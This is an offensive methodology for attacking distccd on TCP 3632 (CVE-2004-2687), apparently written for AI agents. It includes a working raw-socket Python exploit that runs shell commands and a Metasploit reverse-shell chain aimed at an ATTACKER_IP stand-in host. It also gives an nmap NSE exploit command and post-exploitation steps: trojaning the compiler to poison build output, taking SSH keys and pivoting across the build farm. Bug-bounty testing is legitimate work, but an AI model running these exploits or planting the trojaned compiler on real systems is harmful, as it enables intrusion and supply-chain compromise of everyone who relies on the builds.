---
technology: "distcc"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "corpus-grounded at zero chains (command-context gate 2026-11-12: every 'distcc/3632' match in the corpus is digit noise — temp filenames, counters, a Postfix ESMTP id, hex tails; no writeup attacks distcc) — so this methodology is upstream-built by design, per the thin-first-class standing rule. Sources: MITRE CVE-2004-2687 record; distcc official security notes (doc/web/security.html); metasploit-framework exploit/unix/misc/distcc_exec.rb (wire format, sh -c payload, RPORT 3632, DisclosureDate 2002-02-01); distcc doc/protocol-3.txt (DIST/CDIR/ARGC/ARGV/NFIL/NAME/FILE/LINK/DOTD); distccd(1) man page (--allow/--listen/--user/--log-* options, DISTCC_CMDLIST); nmap-service-probes DistCCD probe entry. Companion overview: [[distcc|distcc]]. Supplement (2026-11-13) rewritten from HackTricks (src/network-services-pentesting/3632-pentesting-distcc.md), CC BY-NC 4.0, accessed 2026-11-13 — flag semantics re-verified against the current distccd(1) source and the distcc-cve2004-2687.nse script."
---

# distcc bug bounty methodology

Target model: distccd on TCP/3632, plaintext, no protocol authentication. Every command you cause runs as the
daemon's unprivileged user (nobody/distcc or --user). This is command execution on a build machine — authorization
must be explicit, and note that even nmap's version probe causes a compile on the target. Version gates matter:
distcc 2.x executes arbitrary argv (CVE-2004-2687); 3.0+ refuses to start without --allow.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Service detection (nmap DistCCD probe) | 3632 open | yes | distccd v1 identification, GCC version leak via SOUT — Info |
| Arbitrary argv execution | 2.x daemon, or 3.x with permissive --allow | yes | RCE as unprivileged user — Critical |
| DISTCC_CMDLIST bypass attempts | cmdlist set to compilers only | yes | Compiler-flag abuse (gcc is hostile-input-unsafe per project notes) — Medium |
| MITM job tampering | network position on client→server path | n/a | Poisoned object files / source disclosure — High |
| Config recon | shell or file read on host | n/a | --allow ranges, listen binding, log paths — post-exp |

## Phase 0 — Detect

```bash
nmap -p 3632 -sV 198.51.100.30
# 3632/tcp open  distccd v1
```

nmap's version detection carries a dedicated **DistCCD** probe: it transmits
`DIST00000001ARGC00000005ARGV00000002ccARGV00000002-cARGV00000006nmap.cARGV00000002-oARGV00000006nmap.oDOTI00000000`
and matches the `DONE00000001 STAT... SERR... SOUT... DOTO...` reply; one match rule extracts the `GCC: <version>`
string from SOUT, so a successful `-sV` both fingerprints the daemon and discloses the build compiler. Understand
what this probe does: it submits a compile job. Treat it as the lightest possible interaction — one job, `cc
-c nmap.c`, no filesystem persistence beyond distccd's temp dir.

A listener that answers is either 2.x (no --allow concept enforcement — vulnerable generation) or 3.x explicitly
configured with --allow. If the port is filtered to you but you hold a foothold inside the allowed CIDR, re-run
detection from there.

## Phase 1 — Prove execution with a raw socket (no framework)

The metasploit module's check logic is three packets over one TCP connection — replicate it by hand for a
minimal-footprint proof. Lengths in the ARGV tokens are hex, 8 digits; the `#` argument makes everything after it a
comment so the job still smells like a compile:

```bash
python3 - <<'EOF'
import socket
args = [b"sh", b"-c", b"id > /tmp/proof 2>&1; id", b"#", b"-c", b"main.c", b"-o", b"main.o"]
req  = b"DIST00000001" + b"ARGC%08x" % len(args)
for a in args:
    req += b"ARGV%08x" % len(a) + a
req += b"DOTI0000000A0123456789\n"
s = socket.create_connection(("198.51.100.30", 3632), timeout=10)
s.sendall(req)
data = s.recv(65535)
print(data[:400])   # expect DONE00000001 STAT00000000 SERR... SOUT<your output> DOTO...
EOF
```

Read the reply structurally: `DONE` + protocol version, `STAT` (exit status — 00000000 is success), then length-
prefixed `SERR` and `SOUT` (your command's output — the built-in exfil channel), then `DOTO`. Command output in
SOUT is proof-of-execution; save the transcript as the finding artifact. If the connection closes with no DONE, a
3.x daemon or DISTCC_CMDLIST policy refused the job — see Phase 3.

## Phase 2 — The metasploit chain

exploit/unix/misc/distcc_exec is the canonical weaponized version of Phase 1 (cmd-stage payloads; the module pins
RPORT 3632 and its check sends `sh -c echo <random>` and greps SOUT for the marker):

```text
use exploit/unix/misc/distcc_exec
set RHOSTS 198.51.100.30
set PAYLOAD cmd/unix/reverse_bash        # any of the generic/sh/perl/ruby/bash/telnet/openssl cmd payloads
set LHOST ATTACKER_IP
run
# "Remote code execution via distcc confirmed" from check; shell arrives as the distccd/nobody user
```

Post-shell immediately establish who you are: `id; uname -a; cat /proc/self/cgroup`. A root-started distccd drops
to nobody/distcc before serving, so privesc is the next phase, not the exploit.

## Phase 3 — Gate analysis (why Phase 1 failed) and bypass surface

- **3.0+ startup enforcement**: distccd exits at startup with no --allow; a live daemon means an admin chose to
  open it — enumerate the allowed ranges from the process line and environment: `ps auxww | grep distccd`,
  `/etc/default/distcc` or the init/systemd unit (DISTRCC_ARGS-style option lists live there on distro packages).
- **DISTCC_CMDLIST**: when the env var is set (distro init scripts source /etc/distcc/commands.allow.sh), distccd
  serves only programs named in the list. The project's own security notes refuse to call this a security boundary
  — gcc/cc with attacker-chosen flags and source is not hostile-input-safe. Practical surface: `-o` paths with
  traversal (`ARGV ... -o ../../path`), `-plugin`, preprocessor macros executing at build time, `ccache` wrappers
  in the list (the nmap probe even matches a ccache temp-dir error). Treat "cmdlist blocks my sh" as a filter to
  study, not a wall.
- **--user**: a nonstandard service account in the process line usually means curated build tooling in its HOME —
  inventory it for privesc (SSH keys to the build orchestrator, writable CI configs, cron'd build scripts).

## Phase 4 — Post-exploitation specific to a compile farm

- **Temp artifacts**: each job stages source and objects under the daemon's temp dir (nmap's ccache match rule
  references /usr/share/distcc/.ccache paths on some setups) — previous clients' source may still be there:
  credential-bearing build scripts, proprietary source (report as data exposure).
- **Logs**: `--log-file FILE` (or syslog by default; `--log-stderr` only when run non-inetd/debug per the man
  page) recorded your jobs including argv — note the log path from the process line and expect the client's
  job source to have transited unencrypted TCP (passive-disclosure finding for the report).
- **Build-supply-chain pivot**: with code execution as the daemon, plant a compiler wrapper earlier in PATH than
  the real cc if the environment allows, or target the SSH-based transport configs (~/.ssh for the per-user SSH
  mode) — one trojaned server poisons every object it returns.
- **The client side**: DISTCC_HOSTS on developer workstations names other servers — follow the farm.

## Phase 5 — Reporting anchors

- Pre-auth command execution via compile-job argv (CVE-2004-2687 for 2.x daemons; the project's own security
  notes are the citation for "anyone who can connect") — Critical, with the SOUT transcript attached.
- Unencrypted transport: passive source disclosure + active job tampering (official security notes) — Medium.
- Permissive --allow (0.0.0.0/0 or broad CIDR) on 3.x — the config finding that recreates the 2.x exposure.
- Tools used in this file, in prose: nmap version detection (DistCCD probe), a raw python socket for the
  hand-rolled proof, metasploit's distcc_exec module for the weaponized chain.

## Supplement (2026-11-13): the 3.3 masquerade gate, refusal diagnostics, and the NSE exploit

Rewritten from HackTricks (src/network-services-pentesting/3632-pentesting-distcc.md), CC BY-NC 4.0, accessed 2026-11-13; every flag below re-verified against the current `distccd(1)` manual (distcc master) and the nmap script source before writing.

### distcc 3.3+: TCP mode only runs masqueraded compilers by default

Since distcc 3.3, a daemon in TCP mode executes **only binaries that appear as masquerade links under the distcc compiler directory** (`/usr/lib/distcc` — the same masquerading scheme distcc(1) documents for clients). The `sh` primitive from Phase 1 therefore dies on any current-generation daemon *by default*, not because someone configured DISTCC_CMDLIST. Two consequences:

- The server option `--enable-tcp-insecure` turns the masquerade check **off** — the manual's own words: it "opens distcc up to executing arbitrary code" and exists mainly for the test suite. Its presence in a process line (`ps auxww | grep distccd`) recreates the 2.x exposure exactly.
- Refusals are now diagnosable in two flavors. Per the manual, connections from addresses that fail the `--allow` check are rejected **by closing the TCP connection immediately, with nothing sent to the client** — a bare EOF right after your request is an allowlist miss, not a patched daemon. A daemon that answers with a protocol response but refuses the job instead means network authorization passed and the *executable name* was rejected (masquerade check or DISTCC_CMDLIST). Distinguish these before writing "not vulnerable": re-test from an allowed network position when scope permits.

Two more verified flags for the gate analysis: `--allow-private` widens `--allow` to the RFC1918 ranges plus loopback (10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12, 127.0.0.0/8) — its presence means the daemon trusts every internal subnet; and `--auth` enables GSS-API mutual authentication, but only when the binary was built `--with-auth` (the accompanying `--blacklist`/`--whitelist` files gate by Kerberos principal). An `--auth` daemon is the one deployment where IP-position attacks genuinely stop.

### The nmap NSE exploit (one-shot verification)

nmap ships a dedicated exploit script, `distcc-cve2004-2687`, which performs the CONNECT-shaped request from Phase 1 (`sh -c '<cmd>' # -c main.c -o main.o`) and reports VULNERABLE with the command output:

```bash
nmap -p 3632 198.51.100.30 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'"
```

The command argument defaults to `id`. Naming trap: the script's own header comment (and therefore some docs pages) still shows the **old** script name `distcc-exec` in its example line — the argument prefix that actually works is the script's registered name, `distcc-cve2004-2687.cmd` (the code reads `SCRIPT_NAME .. '.cmd'`). Like metasploit's `check`, this is an intrusive confirmation — it executes a command to prove the finding.
